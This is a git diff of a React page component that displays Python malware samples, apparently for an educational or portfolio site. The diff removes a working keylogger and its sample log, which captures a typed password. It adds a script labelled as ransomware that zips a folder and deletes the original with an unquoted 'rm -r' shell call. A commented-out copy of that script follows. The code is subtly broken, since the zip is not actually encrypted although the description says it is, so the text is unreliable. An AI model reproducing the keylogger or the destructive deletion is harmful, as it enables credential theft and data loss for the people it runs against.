@@ -1,104 +1,188 @@
 import React, { useState, useEffect } from 'react';
-import '../filedisplay.css';
 
 const FileDisplaykey = () => {
 
   return (
     <div className="file-display-container">
-      <div className="file-display-item">
-        <h2 className="file-display-heading">Keylogger.py</h2>
-        <pre className="file-display-content">
-          <code>
-            {`
-# Import necessary packages
-from pynput.keyboard import Key, Listener
-import logging
+           <style>
+        {`
+          .file-display-code-container {
+            width: 50%;
+            float: left;
+          }
+
+          .file-display-description-container {
+            width: 50%;
+            float: right;
+          }
+        `}
+      </style>
+      <div className="file-display-code-container">
+        <div className="file-display-item">
+          <h2 className="file-display-heading">Ransom.py</h2>
+          <pre className="file-display-content">
+            <code>
+              {`
+import zipfile
 import os
+import getpass
 
-# Set the directory and filename for the log file
-log_dir = os.getcwd() + "/"
-log_file = log_dir + "keylogging.txt"
+def encrypt_folder(folder_path):
+    # Get password for encryption
+    password = getpass.getpass(prompt="Enter encryption password: ")
 
-# Configure the logger to write to the log file
-logging.basicConfig(filename=log_file,
-                    level=logging.DEBUG, format='%(asctime)s: %(message)s')
+    # Create a zip file with encryption enabled
+    zip_path = folder_path + '.zip'
+    zip_file = zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED)
+    zip_file.setpassword(password.encode('utf-8'))
 
-# Define the function to be called when a key is pressed
-def on_press(key):
-    logging.info(str(key)) # Write the key to the log file
+    # Add all files in the folder to the zip file
+    for root, dirs, files in os.walk(folder_path):
+        for file in files:
+            file_path = os.path.join(root, file)
+            zip_file.write(file_path, os.path.relpath(file_path, folder_path))
 
-# Start a listener to monitor key presses
-with Listener(on_press=on_press) as listener:
-    try:
-        listener.join() # Wait for the listener to end
-    except KeyboardInterrupt:
-        pass # If the user interrupts the program, exit gracefully
+    # Close the zip file
+    zip_file.close()
 
-            `}
-          </code>
-        </pre>
+    # Remove original folder
+    os.system(f"rm -r {folder_path}")
+
+    return zip_path
+
+def decrypt_folder(zip_path):
+    # Get password for decryption
+    password = getpass.getpass(prompt="Enter decryption password: ")
+
+    # Extract the files from the zip file with the given password
+    with zipfile.ZipFile(zip_path, 'r') as zip_file:
+        zip_file.extractall(pwd=password.encode('utf-8'))
+
+    # Remove the zip file
+    os.remove(zip_path)
+
+if __name__ == '__main__':
+    # Encrypt a folder
+    encrypted_folder = encrypt_folder('/path/to/folder')
+
+    # Decrypt the encrypted folder
+    decrypt_folder(encrypted_folder)
+
+              `}
+            </code>
+          </pre>
+        </div>
       </div>
-      <div className="file-display-item">
-        <h2 className="file-display-heading">Example Output</h2>
-        <pre className="file-display-content">
-          <code>
-            {`
-2023-03-28 21:50:41,985: 't'
-2023-03-28 21:50:42,169: 'e'
-2023-03-28 21:50:42,442: 's'
-2023-03-28 21:50:42,690: 't'
-2023-03-28 21:50:42,834: 'i'
-2023-03-28 21:50:43,001: 'n'
-2023-03-28 21:50:43,073: 'g'
-2023-03-28 21:50:43,257: Key.enter
-2023-03-28 21:50:46,490: 'f'
-2023-03-28 21:50:46,624: 'a'
-2023-03-28 21:50:46,908: 'c'
-2023-03-28 21:50:47,100: 'e'
-2023-03-28 21:50:47,403: 'b'
-2023-03-28 21:50:47,667: 'o'
-2023-03-28 21:50:47,827: 'o'
-2023-03-28 21:50:48,011: 'k'
-2023-03-28 21:50:48,363: '.'
-2023-03-28 21:50:48,539: 'c'
-2023-03-28 21:50:48,803: 'o'
-2023-03-28 21:50:49,148: 'm'
-2023-03-28 21:50:49,406: Key.enter
-2023-03-28 21:50:53,085: 'j'
-2023-03-28 21:50:53,678: 'o'
-2023-03-28 21:50:55,231: 'h'
-2023-03-28 21:50:56,111: 'n'
-2023-03-28 21:50:59,921: '5'
-2023-03-28 21:51:00,137: '5'
-2023-03-28 21:51:00,524: '6'
-2023-03-28 21:51:00,758: '7'
-2023-03-28 21:51:08,413: 'm'
-2023-03-28 21:51:08,710: 'y'
-2023-03-28 21:51:09,222: 'p'
-2023-03-28 21:51:09,365: 'a'
-2023-03-28 21:51:09,542: 's'
-2023-03-28 21:51:09,733: 's'
-2023-03-28 21:51:10,624: 'w'
-2023-03-28 21:51:10,895: 'o'
-2023-03-28 21:51:11,103: 'r'
-2023-03-28 21:51:11,343: 'd'
-2023-03-28 21:51:12,448: '1'
-2023-03-28 21:51:12,824: '2'
-2023-03-28 21:51:13,185: Key.shift
-2023-03-28 21:51:13,424: '!'
-            `}
-          </code>
-        </pre>
-      </div>
-      <div className="file-display-item">
-        <h2 className="file-display-heading">Description</h2>
-        <p className="file-display-description">Install using: pip install pynput
-        <br/>File location may be changed<br/><br/>
-        The code imports necessary packages, sets the directory and filename for the log file, and configures the logger to write to the log file. It then defines a function to be called when a key is pressed and starts a listener to monitor key presses. The logger records every key pressed by the user and stores it in the log file. This code can be used for security purposes to monitor user activity or as a tool for debugging applications.
-        </p>
+      <div className="file-display-description-container">
+        <div className="file-display-item">
+          <h2 className="file-display-heading">Description</h2>
+          <p className="file-display-description">No Installs needed
+            <br/>File location must be changed /path/to/folder<br/><br/>
+            The python code will encrypt the folder and act as Ransomware where it can only be decrypted with the given key. 
+            <br/> This code is for example use only and will need to have certain modifications made, it should not be tested on real folders or be expected to decrypt successfully
+          </p>
+        </div>
       </div>
     </div>
   );
 };
 
 export default FileDisplaykey;
+
+// import React, { useState, useEffect } from 'react';
+// import '../filedisplay.css';
+
+// const FileDisplaykey = () => {
+
+//   return (
+    // <div className="file-display-container">
+    //        <style>
+    //     {`
+    //       .file-display-code-container {
+    //         width: 50%;
+    //         float: left;
+    //       }
+
+    //       .file-display-description-container {
+    //         width: 50%;
+    //         float: right;
+    //       }
+    //     `}
+    //   </style>
+//       <div className="file-display-item">
+//         <h2 className="file-display-heading">Ransomware.py</h2>
+//         <pre className="file-display-content">
+//           <code>
+//             {`
+// import zipfile
+// import os
+// import getpass
+
+// def encrypt_folder(folder_path):
+//     # Get password for encryption
+//     password = getpass.getpass(prompt="Enter encryption password: ")
+
+//     # Create a zip file with encryption enabled
+//     zip_path = folder_path + '.zip'
+//     zip_file = zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED)
+//     zip_file.setpassword(password.encode('utf-8'))
+
+//     # Add all files in the folder to the zip file
+//     for root, dirs, files in os.walk(folder_path):
+//         for file in files:
+//             file_path = os.path.join(root, file)
+//             zip_file.write(file_path, os.path.relpath(file_path, folder_path))
+
+//     # Close the zip file
+//     zip_file.close()
+
+//     # Remove original folder
+//     os.system(f"rm -r {folder_path}")
+
+//     return zip_path
+
+// def decrypt_folder(zip_path):
+//     # Get password for decryption
+//     password = getpass.getpass(prompt="Enter decryption password: ")
+
+//     # Extract the files from the zip file with the given password
+//     with zipfile.ZipFile(zip_path, 'r') as zip_file:
+//         zip_file.extractall(pwd=password.encode('utf-8'))
+
+//     # Remove the zip file
+//     os.remove(zip_path)
+
+// if __name__ == '__main__':
+//     # Encrypt a folder
+//     encrypted_folder = encrypt_folder('/path/to/folder')
+
+//     # Decrypt the encrypted folder
+//     decrypt_folder(encrypted_folder)
+
+//             `}
+//           </code>
+//         </pre>
+//       </div>
+//       <div className="file-display-item">
+//         {/* <h2 className="file-display-heading">Example Output</h2>
+//         <pre className="file-display-content">
+//           <code>
+//             {`
+
+//             `}
+//           </code>
+//         </pre> */}
+//       </div>
+//       <div className="file-display-item">
+//         <h2 className="file-display-heading">Description</h2>
+//         <p className="file-display-description">No Installs needed
+//         <br/>File location msut be changed /path/to/folder<br/><br/>
+//         The python code will encrypt the folder and act as Ransomware where it can only be decrypted with the given key. 
+//         <br/> This code is for example use only and will need to have certain modifications made, it should not be tested on real folders or be expected to decrypt succesfully
+//         </p>
+//       </div>
+//     </div>
+//   );
+// };
+
+// export default FileDisplaykey;
